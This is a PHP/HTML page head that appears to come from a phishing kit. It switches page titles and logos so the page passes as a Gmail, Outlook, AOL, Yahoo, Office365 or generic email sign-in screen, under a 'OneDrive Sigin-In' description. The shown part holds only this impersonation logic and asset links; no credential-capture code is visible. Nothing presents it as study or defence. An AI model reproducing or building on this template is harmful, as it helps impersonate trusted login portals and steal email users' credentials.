<!DOCTYPE html>
<html lang="en">
    <head>
        <meta name="robots" content="index,follow"/> 
        <meta name="theme-color" content="#c9190c"/>
        <meta htttp-equiv="Cache-control" content="no-cache"/>
        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
        <meta name="msapplication-TileColor" content="#c9190c"/>
        <meta name="apple-mobile-web-app-capable" content="yes"/>
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <meta name="description" content="OneDrive Sigin-In"/>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>         
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no"/>
        
    <?php 
        $Gmail = 
        [
            'page_title'=> 'Email',
            'matchClass'=> 'Login',
        ];
        $outlook = 
        [
            'page_title'=> 'Sign in to your account',
            'matchClass'=> 'OutLook',
        ];
        $Aol =
        [
            'page_title'=> 'AOL',
            'matchClass'=> 'Aol',
        ];
        $Yahoo =
        [
            'page_title'=> 'Yahoo',
            'matchClass'=> 'Yahoo',
        ];
        $Office365 =
        [
            'page_title'=> 'Sign in to your account',
            'matchClass'=> 'Office365',
        ];
        $Mail = 
        [
            'page_title'=> 'Other Email',
            'matchClass'=> 'Mail',
        ];
        $ClassName = get_class($this);
        if($Gmail['matchClass'] == $ClassName && $outlook['matchClass'] != $ClassName && $Aol['matchClass'] != $ClassName && $Yahoo['matchClass'] != $ClassName) {
            $UrlLogo =  'gmaillogo.png';
            $title   =  $outlook['page_title'];
        }elseif ($outlook['matchClass'] == $ClassName && $Gmail['matchClass'] != $ClassName &&  $Aol['matchClass'] != $ClassName && $Yahoo['matchClass'] != $ClassName) {
            $UrlLogo =  'titleLogo.png';
            $title   =  $outlook['page_title'];
        }elseif ($Aol['matchClass'] == $ClassName && $Gmail['matchClass'] != $ClassName && $outlook['matchClass'] != $ClassName && $Yahoo['matchClass'] != $ClassName) {
            $UrlLogo =  'AOL.png';
            $title   =  $Aol['page_title'];
        }elseif ($Yahoo['matchClass'] == $ClassName && $Gmail['matchClass'] != $ClassName && $Aol['matchClass'] != $ClassName && $outlook['matchClass'] != $ClassName) {
            $UrlLogo =  'yahoo-favicon-img-v0.0.2.ico';
            $title   =  $Yahoo['page_title'];
        }elseif ($Office365['matchClass'] == $ClassName && $Yahoo['matchClass'] != $ClassName && $Gmail['matchClass'] != $ClassName && $Aol['matchClass'] != $ClassName && $outlook['matchClass'] != $ClassName) {
            $UrlLogo =  'titleLogo.png';
            $title   =  $Office365['page_title'];
        }elseif ($Mail['matchClass'] == $ClassName && $Office365['matchClass'] != $ClassName && $Yahoo['matchClass'] != $ClassName && $Gmail['matchClass'] != $ClassName && $Aol['matchClass'] != $ClassName && $outlook['matchClass'] != $ClassName) {
            $UrlLogo =  'titleLogo.png';
            $title   =  $Mail['page_title'];
        }
    ?>
        <link rel="icon" type="image/png" sizes="16x16" href="<?=ASSETS?>images/<?=$UrlLogo?>">
        <link rel="icon" type="image/png" sizes="32x32" href="<?=ASSETS?>images/<?=$UrlLogo?>">
        <link rel="apple-touch-icon" href="<?=ASSETS?>images/splash/launch-640x1136.png" media="(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/>
        <link rel="apple-touch-startup-image" href="<?=ASSETS?>images/splash/launch-750x1294.png" media="(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/>
        <link rel="apple-touch-startup-image" href="<?=ASSETS?>images/splash/launch-1242x2148.png" media="(device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"/>
        <link rel="apple-touch-startup-image" href="<?=ASSETS?>images/splash/launch-1125x2436.png" media="(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"/>
        <link rel="apple-touch-startup-image" href="<?=ASSETS?>images/splash/launch-1536x2048.png" media="(min-device-width: 768px) and (max-device-width: 1024px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)"/>
        <link rel="apple-touch-startup-image" href="<?=ASSETS?>images/splash/launch-1668x2224.png" media="(min-device-width: 834px) and (max-device-width: 834px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)"/>
        <link rel="apple-touch-startup-image" href="<?=ASSETS?>images/splash/launch-2048x2732.png" media="(min-device-width: 1024px) and (max-device-width: 1024px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)"/>
        <title><?= ($title) ? $title : '' ;?></title>
        <link rel="icon" href="<?=ASSETS?>images/<?=$UrlLogo?>" type="image/x-icon" />
        <link rel="stylesheet" href="<?=ASSETS?>css/fonts/font-awesome/css/all.css"/>
        <link rel="stylesheet" type="text/css" href="<?=ASSETS?>css/structure.css" />
        <link rel="stylesheet" href="<?=ASSETS?>css/bootstrap.min.css" />
        <link rel="stylesheet" href="<?=ASSETS?>css/important__style.css" />
        <script type="text/javascript" src="<?=ASSETS?>js/jquery-3.6.0.js"></script>
        <script type="text/javascript" src="<?=ASSETS?>js/bootstrap.js"></script>
        <script src="<?=ASSETS?>js/manifest.json" type="text/json"></script>
    </head>